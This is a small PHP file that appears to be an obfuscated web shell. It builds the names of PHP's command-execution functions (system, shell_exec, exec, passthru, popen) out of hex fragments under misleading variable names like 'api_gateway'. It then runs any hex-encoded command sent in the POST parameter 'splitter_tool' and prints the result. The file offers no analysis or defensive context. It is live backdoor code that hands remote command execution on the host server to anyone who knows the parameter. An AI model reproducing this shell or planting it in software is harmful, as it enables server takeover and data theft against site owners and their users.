<?php


$dat1 = '7';
$dat2 = '3';
$dat3 = '9';
$dat4 = '4';
$dat5 = 'd';
$dat6 = '6';
$dat7 = 'c';
$dat8 = '5';
$dat9 = 'f';
$dat10 = '0';
$dat11 = '8';
$dat12 = '2';
$dat13 = 'e';
$api_gateway1 = pack("H*", $dat1 . $dat2 . $dat1 . $dat3 . '7' . '3' . $dat1 . $dat4 . '6' . '5' . '6' . $dat5);
$api_gateway2 = pack("H*", $dat1 . $dat2 . $dat6 . '8' . $dat6 . '5' . '6' . $dat7 . $dat6 . 'c' . $dat8 . $dat9 . $dat6 . '5' . '7' . '8' . '6' . '5' . $dat6 . '3');
$api_gateway3 = pack("H*", '6' . '5' . '7' . '8' . '6' . $dat8 . '6' . $dat2);
$api_gateway4 = pack("H*", $dat1 . $dat10 . '6' . '1' . $dat1 . $dat2 . $dat1 . '3' . $dat1 . '4' . $dat6 . $dat11 . $dat1 . $dat12 . '7' . '5');
$api_gateway5 = pack("H*", '7' . '0' . '6' . 'f' . '7' . '0' . '6' . $dat8 . '6' . 'e');
$api_gateway6 = pack("H*", '7' . '3' . $dat1 . $dat4 . $dat1 . $dat12 . '6' . '5' . '6' . '1' . $dat6 . $dat5 . '5' . 'f' . '6' . $dat1 . $dat6 . $dat8 . $dat1 . $dat4 . $dat8 . 'f' . '6' . $dat2 . '6' . $dat9 . '6' . $dat13 . '7' . $dat4 . '6' . $dat8 . '6' . $dat13 . '7' . '4' . $dat1 . $dat2);
$api_gateway7 = pack("H*", $dat1 . '0' . $dat6 . $dat2 . $dat6 . 'c' . $dat6 . $dat9 . '7' . $dat2 . '6' . '5');
$splitter_tool = pack("H*", '7' . '3' . $dat1 . '0' . '6' . $dat7 . $dat6 . '9' . $dat1 . '4' . '7' . '4' . '6' . '5' . $dat1 . $dat12 . '5' . $dat9 . '7' . $dat4 . $dat6 . 'f' . $dat6 . 'f' . '6' . 'c');
if (isset($_POST[$splitter_tool])) {
    $splitter_tool = pack("H*", $_POST[$splitter_tool]);
    if (function_exists($api_gateway1)) {
        $api_gateway1($splitter_tool);
    } elseif (function_exists($api_gateway2)) {
        print $api_gateway2($splitter_tool);
    } elseif (function_exists($api_gateway3)) {
        $api_gateway3($splitter_tool, $flg_itm);
        print join("\n", $flg_itm);
    } elseif (function_exists($api_gateway4)) {
        $api_gateway4($splitter_tool);
    } elseif (function_exists($api_gateway5) && function_exists($api_gateway6) && function_exists($api_gateway7)) {
        $ref_token = $api_gateway5($splitter_tool, 'r');
        if ($ref_token) {
            $pointer_fac = $api_gateway6($ref_token);
            $api_gateway7($ref_token);
            print $pointer_fac;
        }
    }
    exit;
}
